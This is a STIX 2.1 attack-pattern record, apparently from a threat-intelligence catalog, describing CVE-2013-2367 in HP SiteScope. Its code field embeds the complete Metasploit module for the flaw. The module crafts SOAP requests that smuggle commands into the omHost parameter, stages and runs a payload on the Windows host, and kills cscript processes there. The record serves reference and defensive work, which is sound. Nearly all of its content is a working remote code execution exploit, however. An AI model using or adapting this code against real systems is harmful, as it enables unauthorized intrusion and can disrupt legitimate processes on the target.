{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2745357c-467b-4749-99e9-db6d669b4b63",
    "created": "2024-08-14T16:55:17.594262Z",
    "modified": "2024-08-14T16:55:17.594267Z",
    "name": "HP SiteScope Remote Code Execution",
    "description": " This module exploits a code execution flaw in HP SiteScope. The vulnerability exists in the opcactivate.vbs script, which is reachable from the APIBSMIntegrationImpl AXIS service, and uses WScript.Shell.run() to execute cmd.exe with user provided data. Note that the opcactivate.vbs component is installed with the (optional) HP Operations Agent component. The module has been tested successfully on HP SiteScope 11.20 (with HP Operations Agent) over Windows 2003 SP2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/hp_sitescope_runomagentcommand.rb",
            "external_id": "hp_sitescope_runomagentcommand.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-2367"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  HttpFingerprint = { :pattern => [ /Apache-Coyote/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'HP SiteScope Remote Code Execution',\n      'Description' => %q{\n          This module exploits a code execution flaw in HP SiteScope.\n        The vulnerability exists in the opcactivate.vbs script, which\n        is reachable from the APIBSMIntegrationImpl AXIS service, and\n        uses WScript.Shell.run() to execute cmd.exe with user provided\n        data. Note that the opcactivate.vbs component is installed\n        with the (optional) HP Operations Agent component. The module\n        has been tested successfully on HP SiteScope 11.20 (with HP\n        Operations Agent) over Windows 2003 SP2.\n      },\n      'Author'       =>\n        [\n          'rgod <rgod[at]autistici.org>', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2013-2367'],\n          [ 'OSVDB', '95824' ],\n          [ 'BID', '61506' ],\n          [ 'ZDI', '13-205' ]\n        ],\n      'Privileged'  => true,\n      'Platform'    => 'win',\n      'Arch'        => ARCH_X86,\n      'CmdStagerFlavor' => 'vbs',\n      'Targets'     =>\n        [\n          [ 'HP SiteScope 11.20 (with Operations Agent) / Windows 2003 SP2', {} ]\n        ],\n      'DefaultTarget'  => 0,\n      'DefaultOptions'  =>\n        {\n          'CMDSTAGER::DECODER' => File.join(Rex::Exploitation::DATA_DIR, \"exploits\", \"cmdstager\", \"vbs_b64_noquot\")\n        },\n      'DisclosureDate' => '2013-07-29'))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('TARGETURI', [true, 'Path to SiteScope', '/SiteScope/'])\n      ])\n  end\n\n  def uri\n    uri = normalize_uri(target_uri.path)\n    uri << '/' if uri[-1,1] != '/'\n    return uri\n  end\n\n  def check\n\n    op = rand_text_alpha(8 + rand(10))\n    key = rand_text_alpha(8 + rand(10))\n    value = rand_text_alpha(8 + rand(10))\n\n    res = send_soap_request(op, key, value)\n\n    if res and res.code == 200 and res.body =~ /runOMAgentCommandResponse/\n      return Exploit::CheckCode::Detected\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    print_status(\"Delivering payload...\")\n\n    # The path to the injection is something like:\n    # * Java exec => cscript => WScript.Shell => cmd.exe (injection happens)\n    # Empirically has been tested a 1500 value for :linemax makes it work\n    # reliable\n    execute_cmdstager({:linemax => 1500})\n  end\n\n  def get_vbs_string(str)\n    vbs_str = \"\"\n    str.each_byte { |b|\n      vbs_str << \"Chr(#{b})+\"\n    }\n\n    return vbs_str.chomp(\"+\")\n  end\n\n  # Make the modifications required to the specific encoder\n  # This exploit uses an specific encoder because quotes (\")\n  # aren't allowed when injecting commands\n  def execute_cmdstager_begin(opts)\n    var_decoded = @stager_instance.instance_variable_get(:@var_decoded)\n    var_encoded = @stager_instance.instance_variable_get(:@var_encoded)\n    decoded_file = \"#{var_decoded}.exe\"\n    encoded_file = \"#{var_encoded}.b64\"\n    @cmd_list.each { |command|\n      # Because the exploit kills cscript processes to speed up and reliability\n      command.gsub!(/cscript \\/\\/nologo/, \"wscript //nologo\")\n      command.gsub!(/CHRENCFILE/, get_vbs_string(encoded_file))\n      command.gsub!(/CHRDECFILE/, get_vbs_string(decoded_file))\n    }\n  end\n\n  def execute_command(cmd, opts={})\n    # HTML Encode '&' character\n    # taskkill allows to kill the cscript process which is triggering the\n    # different operations performed by the OPACTIVATE command. It speeds\n    # up exploitation and improves reliability (some processes launched can die\n    # due to the fake activation). But this line also will kill other cscript\n    # legit processes which could be running on the target host. Because of it\n    # the exploit has a Manual ranking\n    command = \"&#x22;127.0.0.1 &#x26;&#x26; \"\n    command << cmd.gsub(/&/, \"&#x26;\")\n    command << \" &#x26;&#x26; taskkill /F /IM cscript.exe &#x22;\"\n\n    res = send_soap_request(\"OPCACTIVATE\", \"omHost\", command)\n\n    if res.nil? or res.code != 200 or res.body !~ /runOMAgentCommandResponse/\n      fail_with(Failure::Unknown, \"#{peer} - Unexpected response, aborting...\")\n    end\n\n  end\n\n  def send_soap_request(op, key, value)\n    data = \"<soapenv:Envelope xmlns:xsi=\\\"http://www.w3.org/2001/XMLSchema-instance\\\" xmlns:xsd=\\\"http://www.w3.org/2001/XMLSchema\\\" \"\n    data << \"xmlns:soapenv=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\" xmlns:api=\\\"http://Api.freshtech.COM\\\">\"\n    data << \"<soapenv:Header/>\"\n    data << \"<soapenv:Body>\"\n    data << \"<api:runOMAgentCommand soapenv:encodingStyle=\\\"http://schemas.xmlsoap.org/soap/encoding/\\\">\"\n    data << \"<in0 xsi:type=\\\"x-:Map\\\" xmlns:x-=\\\"http://xml.apache.org/xml-soap\\\">\"\n    data << \"<item xsi:type=\\\"x-:mapItem\\\">\"\n    data << \"<key xsi:type=\\\"xsd:string\\\">#{key}</key>\"\n    data << \"<value xsi:type=\\\"xsd:string\\\">#{value}</value>\"\n    data << \"</item>\"\n    data << \"</in0>\"\n    data << \"<in1 xsi:type=\\\"xsd:string\\\">#{op}</in1>\"\n    data << \"</api:runOMAgentCommand>\"\n    data << \"</soapenv:Body>\"\n    data << \"</soapenv:Envelope>\"\n\n    res = send_request_cgi({\n      'uri'      => normalize_uri(uri, 'services', 'APIBSMIntegrationImpl'),\n      'method'   => 'POST',\n      'ctype'    => 'text/xml; charset=UTF-8',\n      'data'     => data,\n      'headers'  => {\n        'SOAPAction' => '\"\"'\n      }\n    })\n\n    return res\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-07-29",
    "x_mitre_platforms": [
        "win'"
    ]
}